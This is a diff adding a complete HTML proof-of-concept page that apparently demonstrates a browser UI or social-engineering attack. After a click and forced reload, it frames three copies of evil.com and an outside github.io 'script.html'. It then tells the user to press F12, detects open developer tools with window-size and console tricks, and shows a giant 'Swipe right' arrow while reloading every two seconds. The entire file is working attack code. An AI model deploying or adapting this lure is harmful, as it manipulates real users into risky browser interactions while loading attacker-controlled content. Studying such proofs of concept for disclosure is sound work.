@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1" />
+<title>Click → Refresh → 4 iframes POC (Arrow Left→Right)</title>
+<style>
+:root {
+  --bg: #111;
+  --card: linear-gradient(90deg,#ff5555,#55ff55);
+  --text: #fff;
+}
+html,body {
+  height: 100%;
+  margin: 0;
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.center {
+  width: 100%;
+  max-width: 980px;
+  padding: 24px;
+  box-sizing: border-box;
+}
+.big-btn {
+  display: inline-block;
+  padding: 18px 28px;
+  font-size: 20px;
+  border-radius: 12px;
+  background: var(--card);
+  color: #111;
+  cursor: pointer;
+  user-select: none;
+  text-align: center;
+  transition: transform .12s ease, box-shadow .12s ease;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.4);
+}
+.big-btn:active { transform: translateY(1px) scale(.998); }
+.grid {
+  display: grid;
+  grid-template-columns: repeat(2, 1fr);
+  grid-gap: 12px;
+  margin-top: 12px;
+}
+.frame-wrap {
+  width: 100%;
+  height: calc(50vh - 60px);
+  min-height: 180px;
+  background: #0b0b0b;
+  border-radius: 10px;
+  overflow: hidden;
+  border: 1px solid rgba(255,255,255,0.06);
+}
+iframe {
+  width: 100%;
+  height: 100%;
+  border: 0;
+  display: block;
+}
+#pressF12 {
+  margin-top: 12px;
+  font-weight: 600;
+  text-align: center;
+}
+#devMessage {
+  display: none;
+  position: relative;
+  margin-top: 18px;
+  padding: 40px 20px;
+  border-radius: 10px;
+  background: rgba(255,255,255,0.06);
+  color: #fff;
+  font-size: 28px;
+  font-weight: bold;
+  text-align: center;
+  overflow: hidden;
+}
+
+/* Giant arrow from left to right across the screen */
+.arrow-long {
+  position: fixed;
+  left: 0;
+  top: 50%;
+  width: 90vw;
+  height: 6px;
+  background: linear-gradient(90deg, white 60%, transparent);
+  transform: translateY(-50%);
+  border-radius: 3px;
+}
+.arrow-head {
+  position: fixed;
+  top: 50%;
+  right: 5vw;
+  width: 0;
+  height: 0;
+  border-top: 15px solid transparent;
+  border-bottom: 15px solid transparent;
+  border-left: 25px solid white;
+  transform: translateY(-50%);
+}
+</style>
+</head>
+<body>
+<div class="center" id="app">
+  <div id="clickArea" style="display:flex;flex-direction:column;align-items:center;">
+    <div id="clickBtn" class="big-btn">Click</div>
+  </div>
+
+  <div id="iframesContainer" style="display:none;">
+    <div id="pressF12">Press the F12 key</div>
+    <div class="grid" id="gridFrames" style="margin-top:12px;"></div>
+    <div id="devMessage">
+      Swipe right
+      <div class="arrow-long"></div>
+      <div class="arrow-head"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+(function(){
+const CLICK_KEY = "clicked_show_iframes_auto2s";
+const DEV_OPEN_KEY = "dev_open_auto2s";
+
+const clickBtn = document.getElementById("clickBtn");
+const clickArea = document.getElementById("clickArea");
+const iframesContainer = document.getElementById("iframesContainer");
+const gridFrames = document.getElementById("gridFrames");
+const devMessage = document.getElementById("devMessage");
+const pressF12 = document.getElementById("pressF12");
+
+function makeFrame(src, title) {
+  const wrap = document.createElement("div");
+  wrap.className = "frame-wrap";
+  const frame = document.createElement("iframe");
+  frame.src = src;
+  frame.title = title || src;
+  wrap.appendChild(frame);
+  return wrap;
+}
+
+// Button click: store state and reload
+clickBtn.addEventListener("click", () => {
+  sessionStorage.setItem(CLICK_KEY, "1");
+  setTimeout(() => location.reload(), 120);
+});
+
+function showIframes() {
+  clickArea.style.display = "none";
+  iframesContainer.style.display = "block";
+  pressF12.style.display = "block"; 
+  devMessage.style.display = "none"; 
+  gridFrames.style.display = "";
+  gridFrames.innerHTML = "";
+  const sources = [
+    "https://evil.com",
+    "https://evil.com",
+    "https://evil.com",
+    "https://lanaya113505.github.io/pizza/script.html"
+  ];
+  for (let i=0;i<sources.length;i++){
+    gridFrames.appendChild(makeFrame(sources[i], `frame-${i+1}`));
+  }
+}
+
+function showDevMessage() {
+  pressF12.style.display = "none"; 
+  clickArea.style.display = "none";
+  iframesContainer.style.display = "block";
+  gridFrames.style.display = "none";
+  devMessage.style.display = "block";
+}
+
+let devtoolsOpen = false;
+function detectDevToolsOnce() {
+  try {
+    const threshold = 160;
+    if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+      return true;
+    }
+    let detected = false;
+    const el = { toString: () => { detected = true; return ""; } };
+    console.log("%c", el);
+    return detected;
+  } catch(e){ return false; }
+}
+
+function startDevToolsDetector() {
+  setInterval(() => {
+    const isOpen = detectDevToolsOnce();
+
+    if (isOpen && !devtoolsOpen) {
+      devtoolsOpen = true;
+      sessionStorage.setItem(DEV_OPEN_KEY, "1");
+      showDevMessage();
+    } else if (!isOpen && devtoolsOpen) {
+      devtoolsOpen = false;
+      sessionStorage.removeItem(DEV_OPEN_KEY);
+      if (sessionStorage.getItem(CLICK_KEY) === "1") {
+        showIframes();
+      }
+    }
+  }, 300);
+}
+
+setInterval(() => {
+  location.reload();
+}, 2000);
+
+window.addEventListener("load", () => {
+  const clicked = sessionStorage.getItem(CLICK_KEY) === "1";
+  const devOpen = sessionStorage.getItem(DEV_OPEN_KEY) === "1";
+
+  if (clicked) {
+    if (devOpen) {
+      showDevMessage();
+    } else {
+      showIframes();
+    }
+  }
+
+  startDevToolsDetector();
+});
+})();
+</script>
+</body>
+</html>
